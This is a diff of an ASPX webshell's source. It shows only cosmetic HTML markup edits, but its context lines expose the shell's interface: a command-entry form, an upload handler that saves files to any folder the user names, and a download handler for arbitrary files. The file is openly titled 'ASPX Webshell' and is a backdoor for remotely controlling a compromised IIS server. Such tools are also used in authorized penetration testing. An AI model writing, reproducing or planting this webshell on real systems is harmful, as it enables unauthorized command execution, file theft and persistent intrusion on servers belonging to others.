@@ -27,15 +27,15 @@
         }
         catch(System.IO.FileNotFoundException e)
         {
-            downloadMsg = "<code>FileNotFoundException</code> while accessing file <code>" + HttpUtility.HtmlEncode(downloadFile) + "</code><br />\n";
+            downloadMsg = "<code>FileNotFoundException</code> while accessing file <code>" + HttpUtility.HtmlEncode(downloadFile) + "</code><br>\n";
         }
         catch(System.UnauthorizedAccessException e)
         {
-            downloadMsg = "<code>UnauthorizedAccessException</code> while accessing file <code>" + HttpUtility.HtmlEncode(downloadFile) + "</code><br />\n";
+            downloadMsg = "<code>UnauthorizedAccessException</code> while accessing file <code>" + HttpUtility.HtmlEncode(downloadFile) + "</code><br>\n";
         }
         catch(System.IO.IOException e)
         {
-            downloadMsg = "<code>IOException</code> while accessing file <code>" + HttpUtility.HtmlEncode(downloadFile) + "</code><br />\n";
+            downloadMsg = "<code>IOException</code> while accessing file <code>" + HttpUtility.HtmlEncode(downloadFile) + "</code><br>\n";
         }
         finally
         {
@@ -57,19 +57,19 @@
             string dest = System.IO.Path.Combine(uploadDir, uploadFiles[i].FileName);
             try {
                 uploadFiles[i].SaveAs(dest);
-                uploadMsg += "Successfully uploaded <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br />\n";
+                uploadMsg += "Successfully uploaded <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br>\n";
             }
             catch(System.IO.DirectoryNotFoundException e)
             {
-                uploadMsg += "<code>DirectoryNotFoundException</code> while saving file <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br />\n";
+                uploadMsg += "<code>DirectoryNotFoundException</code> while saving file <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br>\n";
             }
             catch(System.UnauthorizedAccessException e)
             {
-                uploadMsg += "<code>UnauthorizedAccessException</code> while saving file <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br />\n";
+                uploadMsg += "<code>UnauthorizedAccessException</code> while saving file <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br>\n";
             }
             catch(System.IO.IOException e)
             {
-                uploadMsg += "<code>IOException</code> while saving file <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br />\n";
+                uploadMsg += "<code>IOException</code> while saving file <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br>\n";
             }
         }
     }
@@ -101,7 +101,7 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <meta charset="UTF-8" />
+        <meta charset="UTF-8">
         <title>ASPX Webshell</title>
         <style>
             body {
@@ -122,9 +122,9 @@
         </style>
     </head>
     <body>
-        <form id="cmdForm" method="POST" action="">
-            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
-            <input type="submit" value="Run" />
+        <form id="cmdForm" method="POST">
+            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox">
+            <input type="submit" value="Run">
         </form>
         <div class="infoText">
 <%
@@ -154,10 +154,10 @@
             <div>
 <%= uploadMsg %>
             </div>
-            <form method="POST" action="" enctype="multipart/form-data">
-                <input type="text" name="uploadDir" placeholder="Destination folder" />
-                <input type="file" name="uploadFiles[]" multiple="multiple" />
-                <input type="submit" value="Upload" />
+            <form method="POST" enctype="multipart/form-data">
+                <input type="text" name="uploadDir" placeholder="Destination folder">
+                <input type="file" name="uploadFiles[]" multiple="multiple">
+                <input type="submit" value="Upload">
             </form>
         </div>
         <div class="featureBox">
@@ -165,9 +165,9 @@
             <div>
 <%= downloadMsg %>
             </div>
-            <form method="POST" action="">
-                <input type="text" name="downloadFile" placeholder="File to download" />
-                <input type="submit" value="Download" />
+            <form method="POST">
+                <input type="text" name="downloadFile" placeholder="File to download">
+                <input type="submit" value="Download">
             </form>
         </div>
         <script>
